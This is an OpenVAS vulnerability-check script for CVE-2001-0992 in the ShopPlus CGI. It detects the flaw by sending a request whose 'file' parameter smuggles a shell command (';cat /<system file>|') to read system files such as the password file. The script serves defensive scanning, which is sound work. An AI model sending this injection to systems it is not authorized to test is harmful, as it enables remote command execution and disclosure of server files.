###############################################################################
# OpenVAS Vulnerability Test
# $Id: shopplus_information_disclosure.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# ShopPlus Arbitrary Command Execution
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
#
# Copyright:
# Copyright (C) 2001 Noam Rathaus <noamr@securiteam.com>
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10774");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-0992");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("ShopPlus Arbitrary Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2001 SecuriTeam");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securiteam.com/unixfocus/5PP021P5FK.html");

  script_tag(name:"summary", value:"The ShopPlus CGI is installed. Some versions of this CGI suffer from a
  vulnerability that allows execution of arbitrary commands with the security privileges of the web server.");
  script_tag(name:"solution", value:"Upgrade to the latest version available by contacting the author of the program.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

# Converts www.honlolo.hostname.com to hostname.com
function reverse_remove(in_string)
{
 finished = 1;
 first = 1;

 #display("in_string: ", in_string, "\n");
 _ret = "";
 for (count = strlen(in_string)-1; finished;)
 {
  #display("count: ", count, "\n");
  #display("in_string[count]: ", in_string[count], "\n");
  if (in_string[count] == string("."))
  {
   if (first)
   {
    first = 0;
#    display("First\n");
   }
   else
   {
    finished = 0;
   }
  }

  if (finished) _ret = string(in_string[count], _ret);

  if (count > 0)
  {
   count = count - 1;
  }
  else
  {
   finished = 0;
  }

 }

 return (_ret);
}


port = get_http_port( default:80 );

files = traversal_files( "linux" );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/shopplus.cgi";
  if( is_cgi_installed_ka( item:url, port:port ) ) {

    hostname = get_host_name();
    fixed_hostname = reverse_remove( in_string:hostname );

    foreach file( keys( files ) ) {

      url = dir + "/shopplus.cgi?dn=" + fixed_hostname + "&cartid=%CARTID%&file=;cat%20/" + files[file] + "|";
      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );